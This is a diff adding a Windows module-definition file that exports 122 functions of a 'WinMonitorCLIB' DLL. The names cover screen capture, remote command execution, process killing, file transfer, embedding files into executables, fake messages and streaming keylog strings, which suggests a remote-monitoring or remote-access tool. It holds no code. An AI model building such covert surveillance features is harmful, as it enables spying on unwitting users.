@@ -1,0 +1,187 @@
+
+LIBRARY	WinMonitorCLIB.1.0.dll
+
+	 EXPORTS
+			
+			;XML Utility Functions
+			
+				 GetErrorX @1
+				 SetTokenSeperatorX @2
+				 CreateNewXmlDocumentX @3
+				 OpenXmlDocumentX @4
+				 GetNodeTextFromHeirarchyX @5
+				 GetNodeAttributeFromHeirarchyX @6
+				 SetTextIntoHeirarchyX @7
+				 SetNodeTextIntoHeirarchyX @8
+				 SetNodeAttributeIntoHeirarchyX @9
+				 InsertAllNodesFromX @10
+				 InsertSelectedNodesFromX @11
+				 MoveToChildByIndexX @12
+				 MoveToChildByNameX @13
+				 MoveToBrotherX @14
+				 ResetSearchPointerToRootX @15
+				 NumberOfBrothersX @16 
+				 NumberOfChildrenX @17 
+				 GetNodeNameX @18
+				 SetForceCreateX @19
+				 MoveToParentX @20
+				 
+				 RegisterAsXmlUtilityUser @21
+				 RemoveXmlUtilityUser @22
+         
+         
+      
+      ;Network Listener Functions
+      
+				 ListenLastError @23
+				 SetListenState @24
+				 GetListenFlag	@25
+				 RetrieveClient	@26
+				 RemoveClient		@27
+				 ListenAt @28
+			     ListenAtEx @29
+			     DisconnectListenConnection @30
+			   
+			   
+			   RegisterAsNwListenerUser @31
+				 RegisterAsNwListenerUserEx @32
+				 RegisterAsNwListenerUserExx @33
+				 RemoveNwListenerUser @34
+				 
+				 
+				 
+				 
+		 ;Network Connection Functions 
+		 
+				 
+				 ConnectionLastError @35
+				 ConnectTo @36
+				 GetIPandPort @37
+				 SendByteStream @38
+				 ReceiveByteStream @39
+				 Disconnect @40
+				 
+				 RegisterAsNwConnectionUser @41
+				 RemoveNwConnectionUser @42
+				 
+			
+		;Generic Network Functions 
+
+			
+		 GenericNetworkLastError @43
+         LoadNetworkLibraryAndVersion @44
+         CleanUpNetworkLibrary @45
+	 
+	 ;ScreenMonitor Functions
+	 
+		RegisterAsScreenMonitorUser  @46
+		RemoveScreenMonitorUser  @47
+
+		SetCompression  @48
+		SetType  @49
+
+		CaptureDesktopImage  @50
+		CaptureWindowImage  @51
+		SaveBitmapToFile  @52
+
+		ReplaceDesktopImage  @53
+		ReplaceWindowImage  @54
+		LoadBitmapFromFile  @55
+
+			
+	;Exe Editor Functions
+	
+		RegisterAsExeEditor @56
+		RegisterAsExeEditorEx @57
+		RegisterAsExeEditorExx @58
+		RemoveExeEditor @59
+		ErrorFlag @60
+		SetExeFileName @61
+		SetResourceInfo @62
+		EmbedFileToexe @63
+		ExtractFileFromExe @64
+		
+	;Browse Folders & Icon Extracter
+	
+		GetFolderName @65
+		GetIconHandle @66
+		
+	;Command Monitor Client Functions
+
+		 RegisterAsCommandMonitorClient @67
+		 RemoveCommandMonitorClient @68
+		 CMCGetResultantType @69
+		 CMCSetCommand @70
+		 CMCSetFakeMessage @71
+		 CMCSetCompression @72
+		 CMCSetTokenSeperator @73
+		 CMCGetResult @74
+		 CMCSaveRemoteFile @102
+		 CMCSetProcessPriority @107
+		 CMCSetKillProcess @108
+		 CMCSetSystemDownMode @109
+		 CMCSetFileUpLoad @122
+
+	;File Monitor Functions
+
+		 RegisterAsFileMonitor @75
+		 RemoveFileMonitor @76
+		 CFMSetFileDataStream @77
+		 CFMSetFileDataStreamEx @105
+		 CFMGetFirstFile @78
+		 CFMGetNextFile @79
+		 CFMGetCurrentFileType @80
+		 CFMGetNumberOfFiles @101
+		 CFMGetCurrentFile @103
+		 CFMGetCurrentFileSize @104
+		 CMCSetRemoteServerCompression @106
+		 CFMIsCurrentFileIsDir @110
+		 		 
+	;Screen Monitor Messenger Functions
+	
+        RegisterAsCScreenMonitorMessenger @81
+		RemoveScreenMonitorMessenger @82
+		ScreenMonitorMessengerSetMessageType @83
+		
+	;Win Monitor Messenger Functions
+	
+		RegisterAsWinMonitorMessenger  @84
+		RemoveWinMonitorMessenger  @85
+		WinMonitorMessengerSetConnection  @86
+		WinMonitorMessengerSynchronizeServer  @87
+		WinMonitorMessengerAuthenticate  @88
+		WinMonitorMessengerExecuteCommandMonitorClient  @89
+		WinMonitorMessengerExecuteScreenMonitorMessenger  @90	
+		WinMonitorMessengerShutDown @91
+		WinMonitorMessengerRegisterType @111
+		
+	
+	;CMainMemory & COsMonitor Functions	 
+	
+		RegisterAsMainMemoryMonitor @92
+		RemoveMainMemoryMonitor @93
+		SetMemoryInfoStream @94
+		GetMainMemoryStatus @95 
+		GetVirtualMemoryStatus @96
+
+		RegisterAsOSMonitor @97
+		RemoveOSMonitor @98
+		SetOSInfoStream @99
+		GetOSInformation @100
+		
+	;CChatClient functions
+	
+		RegisterAsChatClient @112
+		RemoveChatClient @113
+		ChatClientSetConnection @114
+		ChatClientSynchronizeServer @115
+		ChatClientAuthenticate @116
+		ChatClientRegisterType @117
+		ChatClientShutDown @118
+		ChatClientSendChatString @119
+		ChatClientReceieveChatString @120
+		ChatClientReceieveOnLineKeyLogString @121
+
+
+
+	 ;122 ordinals
